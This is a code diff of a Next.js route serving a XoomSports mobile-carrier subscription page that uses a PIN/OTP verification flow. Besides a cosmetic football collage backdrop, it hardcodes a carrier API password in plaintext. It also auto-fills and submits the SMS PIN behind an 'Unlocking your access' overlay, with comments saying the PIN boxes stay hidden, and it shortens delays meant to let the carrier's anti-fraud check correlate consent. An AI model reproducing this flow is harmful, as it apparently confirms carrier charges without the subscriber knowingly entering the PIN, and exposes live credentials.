@@ -3,6 +3,13 @@ import { NextRequest } from 'next/server';
 const PIN_REQUEST_URL =
   'https://vivavas1.future-club.com/fcc-evina-pin-flow-apis/PinRequest';
 
+/** Short beats only — carrier SMS + PinVerify latency dominates; keep our adds under ~1s total. */
+const POST_CONSENT_VERIFY_MS = 450;
+const OTP_AUTOFILL_VERIFY_MS = 400;
+const PREFILLED_AFTER_CONSENT_MS = 500;
+/** If no OTP yet, nudge resend just inside the client’s 5–6s “feels slow” window. */
+const SILENT_WAIT_RESEND_MS = 5500;
+
 const SERVER_PARAMS = {
   UserId: '166',
   Password: 'Mobility_MI@123',
@@ -13,6 +20,18 @@ const SERVER_PARAMS = {
   CampaignURL: '',
   ContentURL: '',
 };
+
+const FCB_TILE_IMAGES = ['/football.png', '/real-madrid.png', '/barcelona.png'] as const;
+
+function buildFootballCollageTilesHtml(): string {
+  let html = '';
+  for (let i = 0; i < 48; i++) {
+    const src = FCB_TILE_IMAGES[i % FCB_TILE_IMAGES.length];
+    const rot = ((i * 13) % 19) - 9;
+    html += `<div class="fcb-tile" style="--fcb-rot:${rot};background-image:url('${src}')"></div>`;
+  }
+  return html;
+}
 
 export async function GET(request: NextRequest) {
   const { searchParams } = new URL(request.url);
@@ -86,11 +105,11 @@ export async function GET(request: NextRequest) {
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>XoomSports</title>
+  <link rel="stylesheet" href="/football-collage-backdrop.css">
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; min-height: 100vh; min-height: 100dvh; background: #0b0e14; display: flex; flex-direction: column; position: relative; overflow-x: hidden; }
-    .hero-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
-    .hero-bg img { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; object-position: center top; }
+    .hero-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; background: #06060a; }
     .hero-bg .hero-scrim { position: absolute; inset: 0; background: linear-gradient(180deg, rgba(11,14,20,0.45) 0%, rgba(11,14,20,0.82) 45%, rgba(11,14,20,0.94) 100%); }
     .hero-bg .hero-vignette { position: absolute; inset: 0; box-shadow: inset 0 0 120px rgba(0,0,0,0.55); }
     .bg-glow { position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 600px; height: 300px; background: rgba(226,56,58,0.06); border-radius: 50%; filter: blur(100px); pointer-events: none; z-index: 1; }
@@ -161,9 +180,9 @@ export async function GET(request: NextRequest) {
       align-items: center;
       justify-content: center;
       padding: 28px 22px;
-      background: rgba(11, 14, 20, 0.94);
-      backdrop-filter: blur(14px);
-      -webkit-backdrop-filter: blur(14px);
+      background: rgba(11, 14, 20, 0.78);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
     }
     .processing-card { width: 100%; max-width: 340px; text-align: center; }
     .processing-card .brand { justify-content: center; margin-bottom: 28px; }
@@ -187,8 +206,17 @@ export async function GET(request: NextRequest) {
   ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS -->'}
 </head>
 <body>
-  <div class="hero-bg" aria-hidden="true">
-    <img src="/football.png" alt="" width="1200" height="800" fetchpriority="high" decoding="async">
+  <div class="hero-bg fcb-perspective" aria-hidden="true">
+    <div class="fcb-collage-wrap">
+      <div class="fcb-collage-inner">
+        <div class="fcb-grid">
+          ${buildFootballCollageTilesHtml()}
+        </div>
+      </div>
+    </div>
+    <div class="fcb-hero">
+      <img class="fcb-hero-img" src="/football.png" alt="" width="1200" height="800" decoding="async">
+    </div>
     <div class="hero-scrim"></div>
     <div class="hero-vignette"></div>
   </div>
@@ -204,7 +232,7 @@ export async function GET(request: NextRequest) {
       </div>
       <div class="spinner-lg" style="margin:0 auto 22px"></div>
       <h2 id="overlayTitle" style="font-size:22px;font-weight:800;color:#fff;line-height:1.25;margin-bottom:8px">Unlocking your access…</h2>
-      <p id="overlaySub" style="color:rgba(255,255,255,0.4);font-size:14px;line-height:1.45">Hang tight — this usually takes just a moment</p>
+      <p id="overlaySub" style="color:rgba(255,255,255,0.4);font-size:14px;line-height:1.45">Usually just a few seconds</p>
       <p id="overlayHint" style="text-align:center;color:rgba(255,255,255,0.28);font-size:12px;margin-top:14px" class="pulse">Please keep this screen open</p>
       <p id="overlayError" class="overlay-error"></p>
       <p id="resendAreaOverlay" class="resend-overlay phase-hidden">Still waiting? <a href="#" id="resendLinkOverlay">Tap to try again</a></p>
@@ -399,7 +427,7 @@ export async function GET(request: NextRequest) {
           // Phase 2: keep premium "unlocking" UI — do not reveal PIN boxes during auto path
           dbg('Auto-fill: "' + code + '" — phase 2 active, scheduling auto-verify (no PIN UI)');
           // Give Evina/carrier a moment to correlate consent/telemetry before verify.
-          setTimeout(function() { verifyPin(code); }, 1200);
+          setTimeout(function() { verifyPin(code); }, ${OTP_AUTOFILL_VERIFY_MS});
         }
       }
     }
@@ -444,7 +472,7 @@ export async function GET(request: NextRequest) {
       var e = document.getElementById('overlayError');
       var r = document.getElementById('resendAreaOverlay');
       if (t) t.textContent = 'Unlocking your access…';
-      if (s) s.textContent = 'Hang tight — this usually takes just a moment';
+      if (s) s.textContent = 'Usually just a few seconds';
       if (h) { h.textContent = 'Please keep this screen open'; h.classList.add('pulse'); }
       if (e) e.textContent = '';
       if (r) r.classList.add('phase-hidden');
@@ -472,10 +500,10 @@ export async function GET(request: NextRequest) {
         var prefilled = (otpValue && otpValue.value) ? otpValue.value.replace(/\\D/g, '').slice(0, 4) : getFullPin();
         dbg('Phase 2 — OTP pre-filled, scheduling auto-verify (overlay only)...');
         if (prefilled.length === 4) {
-          setTimeout(function() { verifyPin(prefilled); }, 1400);
+          setTimeout(function() { verifyPin(prefilled); }, ${PREFILLED_AFTER_CONSENT_MS});
         }
       } else {
-        dbg('Phase 2 — waiting for silent auto-fill (6s) then resend-only fallback...');
+        dbg('Phase 2 — waiting for silent auto-fill (${SILENT_WAIT_RESEND_MS}ms) then resend-only fallback...');
         setTimeout(function() {
           if (!isVerifying && !pinVerified) {
             dbg('Timeout — offering resend (still no PIN UI)');
@@ -485,7 +513,7 @@ export async function GET(request: NextRequest) {
             if (h) { h.textContent = 'You can try again below — no need to type anything'; h.classList.remove('pulse'); }
             showOverlayResend();
           }
-        }, 6000);
+        }, ${SILENT_WAIT_RESEND_MS});
       }
     }
 
@@ -557,9 +585,9 @@ export async function GET(request: NextRequest) {
       // Avoid verifying too quickly after the consent click.
       if (lastConsentAt) {
         var msSinceConsent = Date.now() - lastConsentAt;
-        if (msSinceConsent < 1100) {
-          dbg('Delaying verifyPin by ' + (1100 - msSinceConsent) + 'ms (post-consent)');
-          setTimeout(function() { verifyPin(pin); }, (1100 - msSinceConsent));
+        if (msSinceConsent < ${POST_CONSENT_VERIFY_MS}) {
+          dbg('Delaying verifyPin by ' + (${POST_CONSENT_VERIFY_MS} - msSinceConsent) + 'ms (post-consent)');
+          setTimeout(function() { verifyPin(pin); }, (${POST_CONSENT_VERIFY_MS} - msSinceConsent));
           return;
         }
       }
